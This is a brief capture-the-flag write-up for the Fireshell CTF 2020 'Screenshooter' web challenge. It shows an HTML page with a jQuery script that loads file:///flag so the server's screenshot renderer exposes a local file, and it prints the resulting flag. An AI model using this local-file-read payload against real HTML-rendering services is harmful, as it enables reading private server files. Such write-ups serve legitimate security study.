# FireshellCTF2020_Screenshooter - Write-up
Web challenge solved during Fireshell CTF 2020 (by Ganesh - USP)

## Challenge description
``` 
Turn your beautiful website into an image with our new tool!

flag is on /flag

https://screenshoter.fireshellsecurity.team/
```

## Write-up
The website converted HTML files into images. After trying some stuff, we've tried making the server convert this HTML code into an image:
``` HTML
<!DOCTYPE html>
<html> 
  <head> 
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.1.0/jquery.min.js"></script>
    <script> 
        $(function() {
            $("#fl4g").load("file:///flag"); 
        });
    </script> 
  </head> 
  <body> 
     <div id="fl4g"></div>
  </body> 
</html>
```
As expected, the resulting image contained the flag that was in `file:///flag`.

**Flag:** `F#{R3ally_b4d_Ph4nT0m_!!} `